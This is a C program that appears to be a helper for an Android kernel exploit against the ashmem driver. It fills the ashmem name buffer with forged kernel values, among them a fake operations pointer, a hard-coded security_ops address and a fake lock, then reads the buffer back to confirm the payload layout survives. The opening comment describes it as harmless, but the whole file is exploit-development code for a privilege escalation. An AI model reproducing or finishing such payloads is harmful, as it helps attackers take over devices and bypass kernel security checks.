/* ashmem_check.c - verify what set_name() actually copies for the exploit
 * name buffer. No kernel exploit, no privileged operation. */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define ASHMEM_SET_NAME 0x41007701u
#define ASHMEM_GET_NAME 0x81007702u

static void put32(unsigned char *p, uint32_t v)
{
    p[0] = (unsigned char)(v & 0xff);
    p[1] = (unsigned char)((v >> 8) & 0xff);
    p[2] = (unsigned char)((v >> 16) & 0xff);
    p[3] = (unsigned char)((v >> 24) & 0xff);
}

int main(void)
{
    unsigned char name[256], out[256];
    int fd, r, i;

    memset(name, 0x01, sizeof(name));
    put32(name + 92, 0x01010101u);
    put32(name + 96, 0x41414704u);   /* SCRATCH */
    put32(name + 100, 0x41414704u);
    put32(name + 104, 0x41414104u);  /* FAKE_OPS */
    put32(name + 108, 0xc0ac56d0u);  /* SECURITY_OPS */
    put32(name + 112, 0x41414704u);
    put32(name + 116, 0x41414704u);
    put32(name + 120, 0x41414704u);
    put32(name + 124, 0x41414704u);
    put32(name + 128, 0x41414704u);
    put32(name + 132, 0x01010101u);
    put32(name + 136, 0x41414604u);  /* FAKE_LOCK */

    fd = open("/dev/ashmem", O_RDWR);
    if (fd < 0) {
        printf("open errno=%d\n", errno);
        return 1;
    }
    errno = 0;
    r = ioctl(fd, ASHMEM_SET_NAME, name);
    printf("set=%d errno=%d\n", r, errno);

    memset(out, 0, sizeof(out));
    errno = 0;
    r = ioctl(fd, ASHMEM_GET_NAME, out);
    printf("get=%d errno=%d\n", r, errno);

    printf("name[88..143]=");
    for (i = 88; i < 144; i++)
        printf("%02x", out[i]);
    printf("\n");
    printf("lock@136=%08x node_next@104=%08x node_prev@108=%08x\n",
           (unsigned)(out[136] | (out[137] << 8) | (out[138] << 16) | ((unsigned)out[139] << 24)),
           (unsigned)(out[104] | (out[105] << 8) | (out[106] << 16) | ((unsigned)out[107] << 24)),
           (unsigned)(out[108] | (out[109] << 8) | (out[110] << 16) | ((unsigned)out[111] << 24)));
    return 0;
}
